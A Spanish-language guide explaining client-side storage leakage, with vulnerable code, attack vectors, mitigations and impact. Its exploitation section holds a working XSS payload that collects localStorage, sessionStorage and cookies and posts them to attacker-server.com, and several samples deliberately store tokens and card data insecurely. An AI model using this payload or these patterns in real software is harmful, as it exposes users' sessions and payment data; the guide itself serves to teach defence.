# Vulnerabilidad de Client-Side Storage Leakage

## Descripción

Client-Side Storage Leakage (Fuga de Datos en Almacenamiento del Cliente) es una vulnerabilidad de seguridad que ocurre cuando las aplicaciones web almacenan datos sensibles en el navegador del usuario de manera insegura. Las tecnologías de almacenamiento del lado del cliente como localStorage, sessionStorage y cookies pueden ser utilizadas incorrectamente para guardar información confidencial como tokens de autenticación, datos personales, números de tarjetas de crédito o claves API, quedando expuestos a diversos ataques.

## Detalles Técnicos

### Mecanismos de Almacenamiento en el Cliente

1. **localStorage**: 
   - Almacenamiento persistente que no caduca
   - Capacidad de aproximadamente 5-10MB dependiendo del navegador
   - Accesible desde cualquier página del mismo origen
   - Permanece incluso después de cerrar el navegador
   - Accesible vía JavaScript

2. **sessionStorage**:
   - Similar a localStorage pero limitado a la sesión actual del navegador
   - Se elimina al cerrar la pestaña o ventana
   - Accesible vía JavaScript

3. **Cookies**:
   - Capacidad más limitada (4KB por cookie)
   - Pueden configurarse con atributos de seguridad (HttpOnly, Secure, SameSite)
   - Se envían automáticamente en cada solicitud HTTP al dominio
   - Pueden tener fecha de expiración
   - Accesibles vía JavaScript (excepto las HttpOnly)

### Vectores de Ataque

1. **Cross-Site Scripting (XSS)**: Si un atacante puede inyectar código JavaScript en una página, puede acceder a localStorage, sessionStorage y cookies no-HttpOnly.

2. **Malware en Extensiones del Navegador**: Las extensiones con permisos adecuados pueden acceder al almacenamiento del cliente.

3. **Acceso Físico**: El almacenamiento persiste en el dispositivo y puede ser accedido si el atacante tiene acceso físico.

4. **Cross-Site Request Forgery (CSRF)**: Las cookies sin atributo SameSite pueden ser explotadas.

5. **Man-in-the-Middle**: En conexiones no cifradas, los datos en tránsito pueden ser interceptados.

## Ejemplos de Código Vulnerable

### Almacenamiento Inseguro de Tokens de Autenticación

```javascript
// Almacenar token JWT en localStorage
function login(username, password) {
  fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ username, password })
  })
  .then(response => response.json())
  .then(data => {
    if (data.token) {
      // VULNERABLE: Token de autenticación en localStorage
      localStorage.setItem('authToken', data.token);
      
      // VULNERABLE: Datos sensibles del usuario en localStorage
      localStorage.setItem('userData', JSON.stringify(data.user));
    }
  });
}

// Usar el token almacenado inseguramente
function getProtectedData() {
  const token = localStorage.getItem('authToken');
  
  fetch('/api/protected-data', {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  });
}
```

### Almacenamiento Inseguro de Datos Personales

```javascript
// Almacenar información de pago en sessionStorage
function savePaymentInfo(cardNumber, cvv, expiryDate) {
  // VULNERABLE: Datos de tarjeta en sessionStorage
  sessionStorage.setItem('paymentInfo', JSON.stringify({
    cardNumber,
    cvv,
    expiryDate
  }));
}

// Almacenar preferencias con datos sensibles mezclados
function saveUserPreferences(preferences, personalInfo) {
  // VULNERABLE: Mezcla datos sensibles con no sensibles
  localStorage.setItem('userSettings', JSON.stringify({
    ...preferences,
    ...personalInfo, // Podría contener dirección, teléfono, etc.
  }));
}
```

### Cookies Inseguras

```javascript
// Establecer cookies sin atributos de seguridad
function setAuthCookie(token) {
  // VULNERABLE: Cookie sin HttpOnly, Secure o SameSite
  document.cookie = `authToken=${token}; path=/`;
}

// Almacenar datos sensibles en cookies accesibles por JavaScript
function rememberUser(user) {
  // VULNERABLE: Datos sensibles en cookie accesible por JavaScript
  document.cookie = `userData=${JSON.stringify(user)}; path=/; max-age=2592000`;
}
```

## Código de Explotación

Un atacante que logra ejecutar código JavaScript en el contexto de la aplicación (por ejemplo, mediante XSS) podría robar los datos sensibles almacenados en el cliente:

```javascript
// Script malicioso para robar datos del cliente
function stealClientStorage() {
  const stolenData = {
    url: window.location.href,
    localStorage: {},
    sessionStorage: {},
    cookies: document.cookie
  };
  
  // Robar localStorage
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (key) {
      stolenData.localStorage[key] = localStorage.getItem(key);
    }
  }
  
  // Robar sessionStorage
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    if (key) {
      stolenData.sessionStorage[key] = sessionStorage.getItem(key);
    }
  }
  
  // Enviar datos robados al servidor del atacante
  fetch('https://attacker-server.com/collect', {
    method: 'POST',
    body: JSON.stringify(stolenData),
    mode: 'no-cors' // Evitar errores CORS
  });
}

// Ejecutar inmediatamente
stealClientStorage();
```

## Mitigaciones

### 1. No Almacenar Datos Sensibles en el Cliente

```javascript
// CORRECTO: Almacenar solo datos no sensibles
localStorage.setItem('userPreferences', JSON.stringify({
  theme: 'dark',
  language: 'es',
  notifications: true
}));

// CORRECTO: Para datos sensibles, usar solo identificadores
localStorage.setItem('userId', '12345');
// Luego obtener los datos del servidor cuando sea necesario
```

### 2. Usar Cookies con Atributos de Seguridad

```javascript
// NOTA: Esto debe configurarse en el servidor, no en el cliente
// Ejemplo en Express.js:
app.use(session({
  secret: 'your-secret-key',
  cookie: {
    httpOnly: true,     // Previene acceso desde JavaScript
    secure: true,       // Solo en HTTPS
    sameSite: 'strict', // Previene CSRF
    maxAge: 3600000     // Expiración (1 hora)
  }
}));
```

### 3. Usar Tokens de Corta Duración

```javascript
// Tokens de acceso de corta duración con tokens de refresco
function handleAuthentication(tokens) {
  // Token de acceso no se almacena, se usa inmediatamente
  // o se almacena por corto tiempo en memoria
  const { accessToken, refreshToken } = tokens;
  
  // Solo el token de refresco se almacena de forma segura
  // (idealmente en una cookie HttpOnly)
  // Este código simula lo que debería configurarse en el servidor
  document.cookie = `refreshToken=${refreshToken}; HttpOnly; Secure; SameSite=Strict; path=/`;
  
  // El token de acceso se mantiene en memoria durante la sesión
  authService.setCurrentAccessToken(accessToken);
}
```

### 4. Cifrado de Datos (si es absolutamente necesario almacenar datos sensibles)

```javascript
// Cifrar datos antes de almacenarlos
// (Esto es una mitigación parcial, no una solución completa)
async function encryptAndStore(data, key) {
  // Convertir la clave a un formato utilizable por Web Crypto API
  const cryptoKey = await window.crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(key),
    { name: 'AES-GCM' },
    false,
    ['encrypt']
  );
  
  // Generar un vector de inicialización (IV) aleatorio
  const iv = window.crypto.getRandomValues(new Uint8Array(12));
  
  // Cifrar los datos
  const encodedData = new TextEncoder().encode(JSON.stringify(data));
  const encryptedData = await window.crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    cryptoKey,
    encodedData
  );
  
  // Almacenar datos cifrados y IV
  localStorage.setItem('encryptedData', arrayBufferToBase64(encryptedData));
  localStorage.setItem('iv', arrayBufferToBase64(iv));
}

// Función auxiliar para convertir ArrayBuffer a Base64
function arrayBufferToBase64(buffer) {
  return btoa(String.fromCharCode(...new Uint8Array(buffer)));
}
```

### 5. Implementar Mecanismos Anti-XSS

```javascript
// Utilizar bibliotecas de sanitización para prevenir XSS
import DOMPurify from 'dompurify';

function setUserContent(htmlContent) {
  const sanitizedContent = DOMPurify.sanitize(htmlContent);
  document.getElementById('user-content').innerHTML = sanitizedContent;
}
```

### 6. Validación en el Servidor

```javascript
// Siempre validar datos en el servidor, independientemente de la validación en el cliente
app.post('/api/update-profile', (req, res) => {
  // Validar los datos recibidos
  if (!isValidData(req.body)) {
    return res.status(400).json({ error: 'Datos inválidos' });
  }
  
  // Verificar la autenticación del usuario
  if (!isAuthenticated(req)) {
    return res.status(401).json({ error: 'No autorizado' });
  }
  
  // Procesar los datos...
});
```

## Impacto

El impacto de las vulnerabilidades de Client-Side Storage Leakage puede ser grave:

1. **Robo de Identidad**: Acceso a información personal que permite suplantar a la víctima.
2. **Fraude Financiero**: Acceso a datos de tarjetas de crédito o cuentas bancarias.
3. **Sesión Hijacking**: Robo de tokens de autenticación para acceder a cuentas.
4. **Escalamiento de Privilegios**: Acceso a funcionalidades de administración.
5. **Violaciones de Privacidad**: Exposición de datos médicos, historial de navegación u otra información sensible.

## Conclusión

El almacenamiento del lado del cliente es una herramienta poderosa para mejorar la experiencia del usuario, pero debe utilizarse con precaución. La regla fundamental es nunca almacenar datos sensibles en el cliente. Si es absolutamente necesario almacenar información confidencial, se deben implementar múltiples capas de protección, pero teniendo en cuenta que cualquier dato en el cliente debe considerarse potencialmente comprometido.